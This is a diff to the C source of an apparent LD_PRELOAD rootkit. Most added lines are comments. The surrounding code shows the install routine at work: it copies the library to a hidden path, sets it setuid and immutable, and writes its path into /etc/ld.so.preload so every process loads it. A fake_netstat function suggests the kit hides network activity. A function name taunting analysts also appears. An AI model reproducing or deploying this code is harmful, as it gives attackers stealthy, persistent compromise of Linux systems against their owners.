@@ -89,9 +89,23 @@ int fake_netstat(char *pathname, char *newfile){
     return 1;
 }
 
-//Just to show who's the boss.
+/*
+ * Function:  OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU
+ * --------------------
+ * Just to show who's the boss
+ * 
+ *  returns: shame who "strings"
+ */
 void OH_YOU_THINK_YOU_ARE_A_GREAT_HACKER_BY_LOOKING_AT_STRINGS_AND_SHIT_YOU_IDIOT__YOU_HAVE_BEEN_ADOPTED__NOBODY_LOVES_YOU(){}
 
+
+/*
+ * Function:  install
+ * --------------------
+ * saves the library in MAGIC_PATH, sets premissions & flags and write path on ld.preload.so
+ *
+ *  returns: nothing
+ */
 void install(){
     struct stat buffer;
     if (stat(MAGIC_LIBPATH, &buffer) == 0){
@@ -105,6 +119,7 @@ void install(){
         #ifdef DEBUG
         printf("[-] installing lib in %s\n", MAGIC_LIBPATH);
         #endif
+        // hook real functions and use them
         if (!hooked_fopen){
             hooked_fopen = load_libc("fopen");
         }
@@ -119,6 +134,8 @@ void install(){
             #endif
             return;
         }
+
+        // copy the shared library on the magic path
         char buff[1024];
         size_t n, m;
         do{
@@ -128,12 +145,15 @@ void install(){
         } while ((n > 0) && (n == m));
         fclose(fr);
         fflush(fw);
+
+        // set permission 04555 (setuid/read/execute) and flags IMMUTABLE and APPEND to the library
         unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
         int fd = fileno(fw);
         fchmod(fd, 04555);
         hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
         fclose(fw);
 
+        // store on ld.preload.so the path of shared library
         FILE *fld = hooked_fopen("/etc/ld.so.preload","w");
         if (!fld){
             #ifdef DEBUG
@@ -149,6 +169,7 @@ void install(){
     }
 }
 
+// if doesn't exist a Killswitch this function is useless
 #ifdef KILLSWITCH
 /*
  * Function:  uninstall
